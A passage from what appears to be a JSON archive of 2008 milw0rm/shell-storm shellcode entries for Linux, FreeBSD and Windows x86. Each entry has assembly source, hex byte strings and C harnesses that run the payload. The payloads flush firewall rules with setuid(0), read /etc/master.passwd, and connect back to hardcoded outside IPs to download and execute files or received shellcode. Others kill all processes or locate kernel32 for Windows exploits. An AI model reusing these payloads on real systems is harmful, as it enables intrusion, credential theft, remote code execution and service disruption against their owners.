\"\\xe3\\x53\\x50\\x54\\x53\\xb0\\x3b\\x50\\xcd\"", "       \"\\x80\\x31\\xc0\\x50\\x50\\xcd\\x80\";", "", "int main(int argc, char **argv) {", "", "    /* used to get ip:port combo for pushes */", "        char *ip_addr = \"127.0.0.1\"; // watch for addresses that create \\x00 and others", "        int port = 8000;", "        struct sockaddr_in dest;", "", "        printf(\"IP: %s\\n\", ip_addr);", "        printf(\"PORT: %d\\n\", port);", "", "        dest.sin_family = AF_INET;", "        dest.sin_port=htons(port);", "        dest.sin_addr.s_addr = inet_addr(ip_addr);", "", "        printf(\"push 0x%x\\t; host\\n\", dest.sin_addr.s_addr);", "        printf(\"push 0x%x02AA\\t; port\\n\", dest.sin_port);", "", "        int (*func)();", "        printf(\"Bytes: %d\\n\", sizeof(code));", "        func = (int (*)()) code;", "        (int)(*func)();", "}", "", "*/", "", "// milw0rm.com [2008-08-21]"]},
{"Title": "FreeBSD/x86 - setuid(0) + execve(ipf -Fa) Shellcode (57 bytes)", "Author": "sm4x", "Published": ": 2008-08-21", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-97.php", "View": null, "code": ["; sm4x - 2008", "; setuid(0); execve(\"//sbin/ipf\", {\"//sbin/ipf\", \"-Faa\", 0}, 0);", "; 57 bytes", "; FreeBSD 7.0-RELEASE", "", "global _start", "", "_start:", "main:", "", "; --------------------- setuid (0)", "xor     eax, eax", "xor     ecx, ecx", "push    eax", "push        eax", "mov     al, 0x17", "int     0x80", "; --------------------- -Faa", "xor     eax, eax", "push    eax", "push    0x6161462d      ; -Faa", "mov     ecx, esp", "", "; --------------------- setup //sbin/ipf", "push    eax", "push    word 0x6670", "push    0x692f6e69", "push    0x62732f2f", "mov     ebx, esp", "", "; ---------------------- array setup", "push    eax", "push    ecx", "push    ebx", "mov     ecx, esp", "", "; ---------------------- call to execve", "push    eax", "push    ecx", "push    ebx", "", "mov     al, 0x3b", "push    eax", "int     0x80", "", "xor     eax, eax", "push    eax", "push    eax", "int     0x80", "", "/*", "", "char code[] = \"\\x31\\xc0\\x31\\xc9\\x50\\x50\\xb0\\x17\\xcd    \\x80\"", "                              \"\\x31\\xc0\\x50\\x68\\x2d\\x46\\x61\\x61\\x89\\xe1\"", "                              \"\\x50\\x66\\x68\\x70\\x66\\x68\\x69\\x6e\\x2f\\x69\"", "                              \"\\x68\\x2f\\x2f\\x73\\x62\\x89\\xe3\\x50\\x51\\x53\"", "                              \"\\x89\\xe1\\x50\\x51\\x53\\xb0\\x3b\\x50\\xcd\\x80\"", "                              \"\\x31\\xc0\\x50\\x50\\xcd\\x80\";", "", "int main(int argc, char **argv) {", "        int (*func)();", "        printf(\"Bytes: %d\\n\", sizeof(code));", "        func = (int (*)()) code;", "}", "", "*/", "", "// milw0rm.com [2008-08-21]"]},
{"Title": "FreeBSD/x86 - execve(/bin/cat /etc/master.passwd) + Null-Free Shellcode (65 bytes)", "Author": "sm4x", "Published": ": 2008-08-25", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-99.php", "View": null, "code": ["; sm4x 2008", "; /bin/cat /etc/master.passwd", "; 65 bytes", "; FreeBSD 7.0-RELEASE", "", "global _start", "_start:", "", "xor     eax, eax", "", "; --- setuid(0)", "push    eax", "push    eax", "mov     al, 0x17", "int     0x80", "", "; --- setup /etc/master.passwd", "jmp     short   load_file", "ok:", "pop     esi", "", "; setup /bin/cat", "push    eax", "push    0x7461632f", "push    0x6e69622f", "mov     ebx, esp", "", "; --- array setup", "push    eax     ; null", "push    esi     ; /etc/master.passwd", "push    ebx     ; /bin/cat", "mov     edx, esp", "", "; -- execve()", "push    eax     ; 0", "push    edx     ; array { \"/bin/cat\", \"/etc/master.passwd\", 0}", "push    ebx     ; /bin/cat", "mov     al, 0x3b", "push    eax", "int     0x80", "", "; --- exit", "push    eax", "push    eax", "int     0x80", "", "load_file:", "call    ok", "db      '/etc/master.passwd'", "", "/*", "", "char code[] = \"\\x31\\xc0\\x50\\x50\\xb0\\x17\\xcd\\x80\\xeb\\x1f\"", "       \"\\x5e\\x50\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\"", "       \"\\x69\\x6e\\x89\\xe3\\x50\\x56\\x53\\x89\\xe2\\x50\"", "       \"\\x52\\x53\\xb0\\x3b\\x50\\xcd\\x80\\x50\\x50\\xcd\"", "       \"\\x80\\xe8\\xdc\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\"", "       \"\\x2f\\x6d\\x61\\x73\\x74\\x65\\x72\\x2e\\x70\\x61\"", "       \"\\x73\\x73\\x77\\x64\";", "", "int main(int argc, char **argv) {", "        int (*func)();", "        printf(\"Bytes: %d\\n\", sizeof(code));", "        func = (int (*)()) code;", "        (int)(*func)();", "}", "", "*/", "", "; milw0rm.com [2008-08-25]"]},
{"Title": "Linux/x86 - Reverse (140.115.53.35:9999/TCP) + Download A File (cb) + Execute Shellcode (149 bytes)", "Author": "militan", "Published": ": 2008-08-25", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-206.php", "View": null, "code": ["/*", ";file download shellcode (149 bytes)", ";", ";connect back, download a file and execute.  ", ";modify the name of the file and the ip address first.", ";", ";militan", ";Advanced Defense Lab(ADL)", ";", "", "", "", "global _start", "", "_start:", "", "xor ecx,ecx", "mul ecx", "xor ebx,ebx", "cdq", "", ";socket", "push eax", "push byte 0x1", "push byte 0x2", "mov ecx,esp", "inc ebx", "mov al,0x66", "int 0x80", "mov edi,eax             ;edi=sockfd", "", "", ";connect,port(9999)=270f ip(140.115.53.35)=(8c.73.35.23)  ", "push edx", "push long 0x2335738c     ;address *", "push word 0x0f27        ;port    * ", "mov dl,0x02", "push dx                 ;family  1", "mov ecx,esp              ;adjust struct", "push byte 0x10", "push ecx   ", "push edi                ;sockfd", "mov ecx,esp             ", "mov bl,3                ", "mov al,102", "int 0x80", "", ";sys_open(cb,O_WRONLY|O_CREATE|O_TRUNC[0001.0100.1000=1101],700)", "xor ebx,ebx", "xor ecx,ecx", "push ecx", "push word 0x6263        ;file name=\"cb\" ", "mov ebx,esp", "mov cx,0x242            ", "mov dx,0x1c0            ;Octal", "mov al,5", "int 0x80", "mov esi,eax             ;esi=fd", "", "", ";", "xor ecx,ecx", "mul ecx", "cdq", "mov dx,0x03e8         ;memory chunk=1000=0x03e8: read per time       ", "    ", "L1:                         ", ";sys_read(socket sockfd,buf,len)            ", "xor ebx,ebx", "xor eax,eax", "mov al,3", "mov ebx,edi            ;edi=sock fd", "lea ecx,[esp-1000]      ;memory chunk", "int 0x80", ";sys_write(fd,*buf,count)", "mov ebx,esi               ", "mov edx,eax              ", "xor eax,eax", "mov al,4", "int 0x80", "cmp dx,0x03e8          ", "je L1                  ;loop", "", "", "CONTINUE:", ";sys_close(fd)", "mov ebx,esi             ", "xor eax,eax", "mov al,6", "int 0x80", "", ";execve[./cb,0]      ", "xor ecx,ecx", "mul ecx", "push ecx", "push word 0x6263       ;file name=\"cb\" ", "mov ebx,esp", "push ecx", "push ebx                  ", "mov ecx,esp              ", "mov al,0x0b", "int 0x80", "", "", "EXIT:", "xor eax,eax", "xor ebx,ebx ", "inc eax", "int 0x80", "*/", "", "#include<stdio.h>", "#include<string.h>", "#include<stdlib.h>", "", "", "unsigned char shellcode[]=\"\\x31\\xc9\\xf7\\xe1\\x31\\xdb\\x99\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\"", "\"\\x89\\xc7\\x52\\x68\\x8c\\x73\\x35\\x23\\x66\\x68\\x27\\x0f\\xb2\\x02\\x66\\x52\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb3\\x03\\xb0\\x66\\xcd\\x80\"", "\"\\x31\\xdb\\x31\\xc9\\x51\\x66\\x68\\x63\\x62\\x89\\xe3\\x66\\xb9\\x42\\x02\\x66\\xba\\xc0\\x01\\xb0\\x05\\xcd\\x80\"", "", "\"\\x89\\xc6\\x31\\xc9\\xf7\\xe1\\x99\\x66\\xba\\xe8\\x03\\x31\\xdb\\x31\\xc0\\xb0\\x03\\x89\\xfb\\x8d\\x8c\\x24\\x18\\xfc\\xff\\xff\\xcd\\x80\\x89\\xf3\\x89\\xc2\\x31\\xc0\\xb0\\x04\\xcd\\x80\"", "\"\\x66\\x81\\xfa\\xe8\\x03\\x74\\xde\\x89\\xf3\\x31\\xc0\\xb0\\x06\\xcd\\x80\\x31\\xc9\\xf7\\xe1\\x51\\x66\\x68\\x63\\x62\\x89\\xe3\\x51\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"", "\"\\x31\\xc0\\x31\\xdb\\x40\\xcd\\x80\";", "", "void k(){", " int *ret;", " ret=(int *)&ret+2;", " (*ret)=(int)shellcode;", "}", "", "int main (){", "  k();", "  return 0;", "}", "", "// milw0rm.com [2008-08-25]"]},
{"Title": "Windows/x86 - Reverse (/TCP) + Download File + Save + Execute Shellcode", "Author": "loco", "Published": ": 2008-08-25", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-157.php", "View": null, "code": [";", "; link  -  connectback, receive, save and execute shellcode", ";", "; Copyright (c) 2004 by loco", "; All Rights Reserved", ";", "; NOTE: Compatible with Windows NT based operating systems. IPv4 only.", ";", ";", "", "  .386", "  .model flat, stdcall", "   option casemap:none", "   assume fs:flat", "", "   include C:\\masm32\\include\\windows.inc   ; standard windows header", "   include C:\\masm32\\include\\kernel32.inc  ; definitions of kernel32.dll", "", "   includelib C:\\masm32\\lib\\kernel32.lib   ; we must have kernel32.dll in our process if we want to test it", "", "  .data", "", "   dd GetTickCount ; refer to GetTickCount so that kernel32.dll gets loaded into our process", "", "  .code", "", "   db 'START->'    ; start of shellcode (makes copy n pasting easier later)", "", "; *** stuff that makes our life easier *****************************************", "", "   ; kernel32.dll", "   __imp_ExitThread  equ dword ptr [ebp + 04h]", "   __imp_LoadLibrary equ dword ptr [ebp + 08h]", "   ; msvcrt.dll", "   __imp_fopen       equ dword ptr [ebp + 0ch]", "   __imp_fwrite      equ dword ptr [ebp + 10h]", "   __imp_fclose      equ dword ptr [ebp + 14h]", "   __imp__execv      equ dword ptr [ebp + 18h]", "   ; ws2_32.dll", "   __imp_WSAStartup  equ dword ptr [ebp + 1ch]", "   __imp_socket      equ dword ptr [ebp + 20h]", "   __imp_connect     equ dword ptr [ebp + 24h]", "   __imp_recv        equ dword ptr [ebp + 28h]", "   __imp_send        equ dword ptr [ebp + 2ch]", "   __imp_closesocket equ dword ptr [ebp + 30h]", "", "; *** GetImportAddress macro ***************************************************", "", "GetImportAddress MACRO", "   LOCAL GetImportAddressLoop", "   LOCAL GetImportHashLoop", "", "   mov   edx, dword ptr [edi + 3ch]       ; get offset of PE header", "   mov   edx, dword ptr [edi + edx + 78h] ; get RVA of export directory", "   add   edx, edi                         ; convert it to pointer", "   push  edx                              ; save it to stack", "", "   mov   edx, [edx + 20h]                 ; get rva of rva's of names", "   add   edx, edi                         ; convert it to pointer", "", "   xor   ebx, ebx                         ; index of ordinal will be saved in ebx", "GetImportAddressLoop:", "   inc   ebx                              ; just skip the first entry", "   mov   esi, [edx + ebx * 04h]           ; get rva of name", "   add   esi, edi                         ; convert it to pointer", "   xor   ecx, ecx", "   lodsb                                  ; mov al, byte ptr [esi] -> inc esi", "GetImportHashLoop:", "   xor   cl, al", "   rol   ecx, 5", "   lodsb                                  ; mov al, byte ptr [esi] -> inc esi", "   test  al, al", "   jnz   GetImportHashLoop", "", "   mov   esi, [ebp]                       ; get index of current function", "   sub   ecx, [ebp + esi * 04h]           ; sub the original hash from current", "   jnz   GetImportAddressLoop             ; not equal? try next", "", "   xchg  esi, [esp]                       ; pointer to export table in esi now", "   mov   edx, [esi + 24h]                 ; get rva of array of ordinals", "   add   edx, edi                         ; convert it to pointer", "   mov   cx, [edx + ebx * 2]              ; get ordinal", "", "   mov   edx, [esi + 1ch]                 ; get rva of array of pointers to functions", "   add   edx, edi                         ; convert it to pointer", "", "   mov   eax, [edx + ecx * 4]             ; get rva of function", "   add   eax, edi                         ; convert it to pointer", "   pop   esi                              ; index of current function in esi", "   mov   [ebp + esi * 04h], eax           ; move pointer to correct entry", "   inc   dword ptr [ebp]                  ; increment index of current function", "ENDM", "", "start:", "; *** find kernel32.dll base ***************************************************", "", "   xor   ebx, ebx", "   mov   eax, fs:[ebx + 30h]    ; Extract the PEB", "   mov   eax, [eax + 0ch]       ; Extract the PROCESS_MODULE_INFO pointer from the PEB", "   mov   esi, [eax + 1ch]       ; Get the address of flink in the init module list", "   lodsd                        ; Load the address of blink into eax", "   mov   eax, [eax + 08h]       ; Grab the module base address from the list entry", "", "; *** load the imports *********************************************************", "", "   push  ebx         ; 0", "   push  ebx         ; 0", "   push  '23'        ; ????32 first part of ws2_32", "   push  '_2sw'      ; ws2_?? second part of ws2_32", "   push  'tr'        ; ????rt first part of msvcrt", "   push  'cvsm'      ; msvc?? second part of msvcrt", "   call  OverImportHashes", "   dd 1", "   ; kernel32.dll", "   dd 0D6086235h ; ExitThread", "   dd 094202374h ; LoadLibrary", "   ; msvcrt", "   dd 0CAC999C0h ; fopen", "   dd 069155CB9h ; fwrite", "   dd 040F640B9h ; fclose", "   dd 00DB302D7h ; _execv", "   ; ws2_32.dll", "   dd 0C44DF985h ; WSAStartup", "   dd 018041A9Ch ; socket", "   dd 01AD30183h ; connect", "   dd 0071302C0h ; recv", "   dd 007033480h ; send", "   dd 028398AB4h ; closesocket", "OverImportHashes:", "   pop   ebp", "   push  2", "   pop   ebx", "GetImportAddressOfNextDll:", "   mov   edi, eax", "   push  ebx", "GetImportAddressesLoop:", "   push  ebx", "   GetImportAddress", "   pop   ebx", "   dec   ebx", "   jnz   GetImportAddressesLoop", "", "   pop   ebx", "   add   ebx, 2", "   push  esp                   ; push modulehandle", "   call  dword ptr [ebp + 08h] ; call kernel32.LoadLibraryA", "   add   esp, 8                ; next module", "   test  eax, eax", "   jnz   GetImportAddressOfNextDll", "", "   mov   ah, 02h               ; eax = 00000200", "   sub   esp, eax", "", "; *** connect to IP ************************************************************", "", "   mov   al, ah                ; eax = 00000202", "", "   ; initialize ws2_32.dll", "   push  esp                   ; our receive buffer (abused as WSADATA struct)", "   push  eax                   ; we support 2.2 and above", "   call  __imp_WSAStartup      ; when call succesful, will return 0", "  ", "   ; set up SOCKADDR_IN structure", "   push  eax                   ; 0", "   push  eax                   ; 0", "   push  11111111h             ; ip (will be set by shellcode generator)", "   push  22220002h             ; AF_INET & port (port will be set by shellcode generator)", "   mov   edi, esp", "", "   push  eax                   ; IPPROTO_IP", "   push  1                     ; SOCK_STREAM", "   push  2                     ; AF_INET", "   call  __imp_socket          ; call ws2_32.socket", "   mov   ebx, eax", "", "   ; call it", "   push  10h                   ; sizeof SOCKADDR_IN", "   push  edi                   ; ptr SOCKADDR_IN", "   push  ebx                   ; socket", "   call  __imp_connect         ; call ws2_32.connect", "   ; the only check!", "   test  eax, eax", "   jnz   Exit", "", "; *** send the request key *****************************************************", "", "   mov   dword ptr [ebp], 33333333h ; request key (will be set by shellcode generator)", "", "   push  eax                        ; flags (0)", "   push  4                          ; length (4)", "   push  ebp                        ; buffer", "   push  ebx                        ; socket", "   call  __imp_send                 ; call ws2_32.send", "", "; *** receive file *************************************************************", "", "   mov   esi, esp                    ; save pointer to buffer in esi", "", "   ; we want read/write access", "   mov   dword ptr [ebp], 'bw'", "   push  'exe'                       ; second part 0, 'exe'", "   push  '.xxx'                      ; first part '.xxx' (will be set by generator)", "   mov   edi, esp                    ; save filename in edi", "   push  ebp                         ; push pointer to 'wb'", "   push  edi                         ; push pointer to filename", "   call  __imp_fopen                 ; call msvrt.fopen", "   mov   [ebp], eax                  ; move FILE stream in esi", "   ; add   esp, 8                    ; no need to clean stack", "", "   ; receive loop", "ReceiveFile:", "   push  0                     ; flags", "   push  512                   ; buffersize", "   push  esi                   ; buffer", "   push  ebx                   ; socket", "   call  __imp_recv            ; call ws2_32.recv", "   test  eax, eax", "   jz    DoneReceiving", "   js    Exit", "", "   push  [ebp]                 ; FILE", "   push  eax                   ; nitems", "   push  1                     ; item size", "   push  esi                   ; buffer", "   call  __imp_fwrite          ; call msvcrt.fwrite", "   add   esp, 10h              ; clean stack", "", "   jmp   ReceiveFile", "", "DoneReceiving:", "   push  [ebp]         ; push FILE stream to close", "   call  __imp_fclose  ; call msvcrt.fclose, returns 0 if succesful", "   ; add   esp, 4      ; not needed to clean stack", "", "   push  eax", "   push  esp           ; varguments", "   push  edi           ; filename", "   call  __imp__execv  ; call msvcrt._execv", "   ; add   esp, 8      ; not needed to clean stack", "", "Exit:", "   push  ebx                                ; socket", "   call  __imp_closesocket                  ; call ws2_32.closesocket", "", "   ; push  0                                ; we don't care about the exit code    ", "   call  __imp_ExitThread                   ; call kernel32.ExitThread", "", "; ******************************************+**********************************", "   db '<-END'                 ; end of shellcode", "; ******************************************+**********************************", "", "end start", "", "; milw0rm.com [2008-08-25]"]},
{"Title": "Windows/x86 - PEB 'Kernel32.dll' ImageBase Finder + Alphanumeric Shellcode (67 bytes)", "Author": "Koshi", "Published": ": 2008-09-03", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-394.php", "View": null, "code": ["/*", "", " PEB Kernel32.dll ImageBase Finder ( Alphanumeric )", " Author: Koshi", " Description: Uses PEB method to locate the ImageBase of Kernel32.dll", "              ONLY supports NT/2K/XP.. sorry no 9X. ImageBase will be", "    \t      returned in EAX. No null bytes, obviously, so no need to", "\t      encode really.", " Length: 67 Bytes", " Registers Used: ecx,eax,esi", " Compiled: j0X40PVTY631d3F04m4a30VXVTY631V4P4L30XPVXVTY631V30VXVTY631V4X4P30VX", "", "*/", "", "/*", "", "00401000 > $ 6A 30          PUSH 30", "00401002   . 58             POP EAX", "00401003   . 34 30          XOR AL,30", "00401005   . 50             PUSH EAX", "00401006   . 56             PUSH ESI", "00401007   . 54             PUSH ESP", "00401008   . 59             POP ECX", "00401009   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]", "0040100C   . 64:3346 30     XOR EAX,DWORD PTR FS:[ESI+30]", "00401010   . 34 6D          XOR AL,6D", "00401012   . 34 61          XOR AL,61", "00401014   . 3330           XOR ESI,DWORD PTR DS:[EAX]", "00401016   . 56             PUSH ESI", "00401017   . 58             POP EAX", "00401018   . 56             PUSH ESI", "00401019   . 54             PUSH ESP", "0040101A   . 59             POP ECX", "0040101B   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]", "0040101E   . 56             PUSH ESI", "0040101F   . 34 50          XOR AL,50", "00401021   . 34 4C          XOR AL,4C", "00401023   . 3330           XOR ESI,DWORD PTR DS:[EAX]", "00401025   . 58             POP EAX", "00401026   . 50             PUSH EAX", "00401027   . 56             PUSH ESI", "00401028   . 58             POP EAX", "00401029   . 56             PUSH ESI", "0040102A   . 54             PUSH ESP", "0040102B   . 59             POP ECX", "0040102C   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]", "0040102F   . 56             PUSH ESI", "00401030   . 3330           XOR ESI,DWORD PTR DS:[EAX]", "00401032   . 56             PUSH ESI", "00401033   . 58             POP EAX", "00401034   . 56             PUSH ESI", "00401035   . 54             PUSH ESP", "00401036   . 59             POP ECX", "00401037   . 36:3331        XOR ESI,DWORD PTR SS:[ECX]", "0040103A   . 56             PUSH ESI", "0040103B   . 34 58          XOR AL,58", "0040103D   . 34 50          XOR AL,50", "0040103F   . 3330           XOR ESI,DWORD PTR DS:[EAX]", "00401041   . 56             PUSH ESI", "00401042   . 58             POP EAX", "", "", "*/", "", "unsigned char Shellcode[] =", "{\"\\x6A\\x30\\x58\\x34\\x30\\x50\\x56\\x54\"", "\"\\x59\\x36\\x33\\x31\\x64\\x33\\x46\\x30\"", "\"\\x34\\x6D\\x34\\x61\\x33\\x30\\x56\\x58\"", "\"\\x56\\x54\\x59\\x36\\x33\\x31\\x56\\x34\"", "\"\\x50\\x34\\x4C\\x33\\x30\\x58\\x50\\x56\"", "\"\\x58\\x56\\x54\\x59\\x36\\x33\\x31\\x56\"", "\"\\x33\\x30\\x56\\x58\\x56\\x54\\x59\\x36\"", "\"\\x33\\x31\\x56\\x34\\x58\\x34\\x50\\x33\"", "\"\\x30\\x56\\x58\"};", "", "", "", "int main( int argc, char *argv[] )", "{", " printf( \"Shellcode is %u bytes.\\n\", sizeof(Shellcode)-1 );", " printf( Shellcode, sizeof(Shellcode) );", " return 0;", "}", "", "// milw0rm.com [2008-09-03]"]},
{"Title": "Windows/x86 - PEB 'Kernel32.dll' ImageBase Finder + ASCII Printable Shellcode (49 bytes)", "Author": "Koshi", "Published": ": 2008-09-03", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-393.php", "View": null, "code": ["/*", "", " PEB Kernel32.dll ImageBase Finder ( Ascii Printable )", "", " Author: Koshi", "", " Description: Uses PEB method to locate the ImageBase of Kernel32.dll", "              ONLY supports NT/2K/XP.. sorry no 9X. ImageBase will be", "\t      returned in EAX. No null bytes, obviously, so no need to", "\t      encode really.", "", " Length: 49 Bytes", " Registers Used: eax,esi", " Compiled: j0X40PPPd3@0^V4L4@^V30VX^4P4L30XPVX^30VX^4X4P30VX", "", "*/", "", "/*", "", "00401000 > $ 6A 30          PUSH 30", "00401002   . 58             POP EAX", "00401003   . 34 30          XOR AL,30", "00401005   . 50             PUSH EAX", "00401006   . 50             PUSH EAX", "00401007   . 50             PUSH EAX", "00401008   . 64:3340 30     XOR EAX,DWORD PTR FS:[EAX+30]", "0040100C   . 5E             POP ESI", "0040100D   . 56             PUSH ESI", "0040100E   . 34 4C          XOR AL,4C", "00401010   . 34 40          XOR AL,40", "00401012   . 5E             POP ESI", "00401013   . 56             PUSH ESI", "00401014   . 3330           XOR ESI,DWORD PTR DS:[EAX]", "00401016   . 56             PUSH ESI", "00401017   . 58             POP EAX", "00401018   . 5E             POP ESI", "00401019   . 34 50          XOR AL,50", "0040101B   . 34 4C          XOR AL,4C", "0040101D   . 3330           XOR ESI,DWORD PTR DS:[EAX]", "0040101F   . 58             POP EAX", "00401020   . 50             PUSH EAX", "00401021   . 56             PUSH ESI", "00401022   . 58             POP EAX", "00401023   . 5E             POP ESI", "00401024   . 3330           XOR ESI,DWORD PTR DS:[EAX]", "00401026   . 56             PUSH ESI", "00401027   . 58             POP EAX", "00401028   . 5E             POP ESI", "00401029   . 34 58          XOR AL,58", "0040102B   . 34 50          XOR AL,50", "0040102D   . 3330           XOR ESI,DWORD PTR DS:[EAX]", "0040102F   . 56             PUSH ESI", "00401030   . 58             POP EAX", "", "*/", "", "unsigned char Shellcode[] =", "{\"\\x6A\\x30\\x58\\x34\\x30\\x50\\x50\\x50\"", "\"\\x64\\x33\\x40\\x30\\x5E\\x56\\x34\\x4C\"", "\"\\x34\\x40\\x5E\\x56\\x33\\x30\\x56\\x58\"", "\"\\x5E\\x34\\x50\\x34\\x4C\\x33\\x30\\x58\"", "\"\\x50\\x56\\x58\\x5E\\x33\\x30\\x56\\x58\"", "\"\\x5E\\x34\\x58\\x34\\x50\\x33\\x30\\x56\"", "\"\\x58\"};", "", "int main( int argc, char *argv[] )", "{", " printf( \"Shellcode is %u bytes.\\n\", sizeof(Shellcode)-1 );", " printf( Shellcode, sizeof(Shellcode) );", " return 0;", "}", "", "// milw0rm.com [2008-09-03]"]},
{"Title": "FreeBSD/x86 - Reverse Connection (172.17.0.9:8000/TCP) + Receive Shellcode + Payload Loader + Return Results Null-Free Shellcode (90 bytes)", "Author": "sm4x", "Published": ": 2008-09-05", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-167.php", "View": null, "code": ["/*", "; sm4x - 2008", "; reverse connect dl(shellcode) and execute, exit", ";  - i've used this to feed pwnd progs huge messy shellcode ret'ing the results over nc ;)", ";  - feed it with a $nc -vvl -p8000 <shellcode_in_file", "; setuid(0); socket(); connect(); dups(); recv(); jmp; exit();", "; 90 bytes (NULL free dep on remote address)", "; FreeBSD 7.0-RELEASE", "", "global _start", "_start:", "", "xor     eax, eax", "", "; --- setuid(0)", "push    eax", "push    eax", "mov     al, 0x17", "push    eax", "int     0x80", "", "; --- socket()", "push    eax", "push    byte 0x01", "push    byte 0x02", "mov     al, 0x61", "push    eax", "int     0x80", "mov     edx, eax", "", "; --- sockaddr_in setup", "push    0x90011ac      ; host 172.17.0.9 (.0. is a NULL)", "push    0x401f02AA     ; port 8000", "mov     eax, esp", "", "; --- setup connect(edx, eax, 0x10);", "push    byte 0x10", "push    eax", "push    edx", "xor     eax, eax", "mov     al, 0x62", "push    eax", "int     0x80", "jne     done", "", "; --- dup2(0+1+2) - remove if you dont want results sent over the wire", "mov     cl, 0x03", "xor     ebx, ebx", "dups:", "push    ebx", "push    edx", "mov     al, 0x5a", "push    eax", "int     0x80", "inc     ebx", "loop    dups", "", "; --- recv(fd, *buf, 1028);", "xor     eax, eax", "push    word 0x0404      ; conf read size here", "lea     ecx, [esp-0x0404] ; and here", "push    ecx          ", "push    edx", "mov     al, 0x03", "push    eax", "int     0x80", "", "; --- jmp to recv shellcode", "jmp     ecx          ; run shellcode", "done:", "", "; --- exit (optional -> pls exit from jmp shellcode)", "xor     eax, eax", "inc     eax", "push    eax", "push    eax", "int     0x80", "", "*/", "", "#include <stdio.h>", "#include <sys/socket.h>", "#include <netinet/in.h>", "", "char code[] = \"\\x31\\xc0\\x50\\x50\\xb0\\x17\\x50\\xcd\\x80\\x50\"", "       \"\\x6a\\x01\\x6a\\x02\\xb0\\x61\\x50\\xcd\\x80\\x89\"", "       \"\\xc2\\x68\\xac\\x11\\x00\\x09\\x68\\xaa\\x02\\x1f\"", "       \"\\x40\\x89\\xe0\\x6a\\x10\\x50\\x52\\x31\\xc0\\xb0\"", "       \"\\x62\\x50\\xcd\\x80\\x75\\x24\\xb1\\x03\\x31\\xdb\"", "       \"\\x53\\x52\\xb0\\x5a\\x50\\xcd\\x80\\x43\\xe2\\xf6\"", "       \"\\x31\\xc0\\x66\\x68\\x04\\x04\\x8d\\x8c\\x24\\xfc\"", "       \"\\xfb\\xff\\xff\\x51\\x52\\xb0\\x03\\x50\\xcd\\x80\"", "       \"\\xff\\xe1\\x31\\xc0\\x40\\x50\\x50\\xcd\\x80\";", "", "int main(int argc, char **argv) {       ", " int (*func)();", " printf(\"Bytes: %d\\n\", sizeof(code));", " func = (int (*)()) code;", " (int)(*func)(); ", "}", "", "// milw0rm.com [2008-09-05]"]},
{"Title": "FreeBSD/x86 - Kill All Processes Shellcode (12 bytes)", "Author": "suN8Hclf", "Published": ": 2008-09-09", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-102.php", "View": null, "code": ["            ***(C)oDed bY suN8Hclf***", "       DaRk-CodeRs Group productions, kid", " [FreeBSD x86 kill all procesess 12 bytes shellcode]", "", "", "Compile:", "nasm -f elf code.asm", "ld -e _start -o code code.o", "", "Assembly code:", "---------------------code.asm-------------------", "section .text", "global _start", "", "_start:", "xor eax, eax", "push byte 9 ; SIGKILL", "dec eax", "push eax    ; -1 (0xffffffff)", "inc eax", "mov al, 37  ;kill() syscall number, check /usr/src/sys/kern/syscalls.master for details", "push eax", "int 0x80", "---------------------code.asm-------------------", "", "And C code:", "---------------------code.c---------------------", "#include <stdio.h>", "", "char shellcode[]=", "\"\\x31\\xc0\\x6a\\x09\\x48\\x50\\x40\\xb0\\x25\\x50\\xcd\\x80\";", "", "int main()", "{", "int (*func)();", "func=(int (*)())shellcode;", "(int)(*func)();", "}", "---------------------code.c---------------------", "", "", "Greetz: all DaRk-CodeRs guys, e.wiZz!, doctor", "Visit : www.dark-coders.pl", "", "# milw0rm.com [2008-09-09]"]},
{"Title": "Linux/x86 - System Beep Shellcode (45 bytes)", "Author": "Thomas Rinsma", "Published": ": 2008-09-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-60.php", "View": null, "code": ["/*", "By Thomas Rinsma <me[at]th0mas.nl> (16 apr. 2008)", "", "Shellcode makes system speaker beep once, 45 bytes:", "", "", "   ;     int fd = open(\"/dev/tty10\", O_RDONLY);", "   push byte 5", "   pop eax", "   cdq", "   push edx", "   push 0x30317974", "   push 0x742f2f2f", "   push 0x7665642f", "   mov ebx, esp", "   mov ecx, edx", "   int 80h", "", "   ;     ioctl(fd, KDMKTONE (19248), 66729180);", "   mov ebx, eax", "   push byte 54", "   pop eax", "   mov ecx, 4294948047", "   not ecx", "   mov edx, 66729180", "   int 80h", "*/", "", "", "main()", "{", "   char shellcode[] =", "       \"\\x6a\\x05\\x58\\x99\\x52\\x68\\x74\\x79\\x31\\x30\\x68\\x2f\\x2f\\x2f\\x74\"", "       \"\\x68\\x2f\\x64\\x65\\x76\\x89\\xe3\\x89\\xd1\\xcd\\x80\\x89\\xc3\\x6a\\x36\"", "       \"\\x58\\xb9\\xcf\\xb4\\xff\\xff\\xf7\\xd1\\xba\\xdc\\x34\\xfa\\x03\\xcd\\x80\";", "", "   (*(void (*)()) shellcode)();", "}", "", "// milw0rm.com [2008-09-09]"]},
